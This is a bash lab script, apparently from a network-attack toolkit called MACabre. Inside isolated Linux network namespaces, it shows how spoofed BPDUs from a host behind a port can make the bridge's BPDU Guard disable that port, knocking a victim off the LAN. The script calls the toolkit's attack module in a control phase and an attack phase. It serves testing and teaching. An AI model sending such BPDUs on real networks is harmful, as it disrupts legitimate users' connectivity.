#!/usr/bin/env bash
# Isolated BPDU Guard trigger abuse lab (Linux only, needs root).
#
# Topology, all inside network namespaces:
#
#   lan (bridge br0, STP on) --(p-seg / h-seg veth)-- seg
#   seg (bridge br1, a hub: no STP, BPDUs forwarded) with two hosts behind it:
#     victim:   the host on the protected port.
#     attacker: sends configuration BPDUs with MACabre's module.
#   The LAN switch's port p-seg is the protected port. Its BPDU Guard is turned on or off
#   per phase.
#
# Phases (each phase starts from a fresh topology):
#   Phase 1 (control): BPDU Guard off on p-seg. The attacker sends BPDUs. The port should
#            stay up (not disabled).
#   Phase 2 (attack): BPDU Guard on p-seg. The attacker sends the same BPDUs. The port
#            should go to the disabled state, which takes the victim off the LAN.
#
# What the lab shows: whether the Linux bridge's BPDU guard disables a protected port after
# a BPDU from a host behind it. It does not show a vendor switch's err-disable recovery
# timer, its log messages or other port types. Nothing here touches the host's real
# network interfaces.
#
# Usage:
#   sudo scripts/lab/bpdu_guard_trigger_abuse_lab.sh
#
# Requirements: iproute2 (ip, bridge) and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
ATTACKER_MAC="02:00:00:00:00:20"
BPDUS=3
WAIT_FORWARDING=20

stop_lab() {
    for ns in lan seg victim attacker; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

# Prints the state of the protected port on the LAN switch.
port_state() {
    ip netns exec lan bridge link show dev p-seg 2>/dev/null | grep -o 'state [a-z]*' | cut -d' ' -f2 || echo "missing"
}

# Builds the topology, with BPDU Guard on p-seg when $1 is "on".
build_topology() {
    local guard="$1"
    stop_lab

    ip netns add lan
    ip netns add seg
    ip netns add victim
    ip netns add attacker

    ip link add p-seg type veth peer name h-seg
    ip link set p-seg netns lan
    ip link set h-seg netns seg

    ip link add s-vic type veth peer name h-vic
    ip link set s-vic netns seg
    ip link set h-vic netns victim
    ip link add s-atk type veth peer name h-atk
    ip link set s-atk netns seg
    ip link set h-atk netns attacker

    ip netns exec lan ip link add br0 type bridge stp_state 1 forward_delay 2
    ip netns exec lan ip link set br0 up
    ip netns exec lan ip link set p-seg master br0
    ip netns exec lan ip link set p-seg up
    if [[ "$guard" == "on" ]]; then
        ip netns exec lan bridge link set dev p-seg guard on
    fi

    # The segment is a hub: no STP, and BPDUs are forwarded to every host.
    ip netns exec seg ip link add br1 type bridge
    ip netns exec seg ip link set br1 up
    for port in h-seg s-vic s-atk; do
        ip netns exec seg ip link set "$port" master br1
        ip netns exec seg ip link set "$port" up
    done
    ip netns exec seg ip link set lo up

    ip netns exec victim ip link set h-vic up
    ip netns exec victim ip link set lo up
    ip netns exec attacker ip link set h-atk address "$ATTACKER_MAC"
    ip netns exec attacker ip link set h-atk up
    ip netns exec attacker ip link set lo up
}

wait_forwarding() {
    for _ in $(seq 1 "$WAIT_FORWARDING"); do
        [[ "$(port_state)" == "forwarding" ]] && return 0
        sleep 1
    done
    return 1
}

SEND_CODE='
import os
from scapy.all import sendp
from macabre.attacks.bpdu_guard_trigger_abuse import BpduGuardTriggerConfig, run_bpdu_guard_trigger
import threading
stats = run_bpdu_guard_trigger(
    BpduGuardTriggerConfig(iface="h-atk", source_mac=os.environ["ATTACKER_MAC"], bpdus=int(os.environ["BPDUS"])),
    threading.Event(),
    lambda _s: None,
)
print(stats.bpdus)
'

run_phase() {
    local guard="$1"
    build_topology "$guard"
    if ! wait_forwarding; then
        echo "  the port did not reach forwarding; result unreliable"
        return 1
    fi
    echo "  port before the BPDUs: $(port_state)"
    SENT="$(ip netns exec attacker env PYTHONPATH="$ROOT/src" ATTACKER_MAC="$ATTACKER_MAC" BPDUS="$BPDUS" \
        "$PY" -c "$SEND_CODE" 2>/dev/null || echo 0)"
    echo "  BPDUs sent by the attacker: $SENT"
    sleep 3
    AFTER="$(port_state)"
    echo "  port after the BPDUs: $AFTER"
}

echo "Phase 1: control, BPDU Guard off on the protected port"
run_phase off
CONTROL_AFTER="$AFTER"
CONTROL_SENT="$SENT"
echo

echo "Phase 2: attack, BPDU Guard on the protected port"
run_phase on
ATTACK_AFTER="$AFTER"
ATTACK_SENT="$SENT"
echo

if [[ "$CONTROL_SENT" == "$BPDUS" && "$ATTACK_SENT" == "$BPDUS" && "$CONTROL_AFTER" != "disabled" && "$ATTACK_AFTER" == "disabled" ]]; then
    echo "Result: with BPDU Guard off, the protected port stayed up after $BPDUS BPDUs from a host behind it. With BPDU Guard on, the same BPDUs disabled the port, which takes the victim off the LAN until it is re-enabled. The err-disable recovery and log behavior of vendor switches are not tested here."
    exit 0
elif [[ "$ATTACK_AFTER" != "disabled" ]]; then
    echo "Result: inconclusive. With BPDU Guard on the port was not disabled on this kernel. Result unreliable."
    exit 2
else
    echo "Result: the outcome did not match the expected phases. Result unreliable."
    exit 1
fi
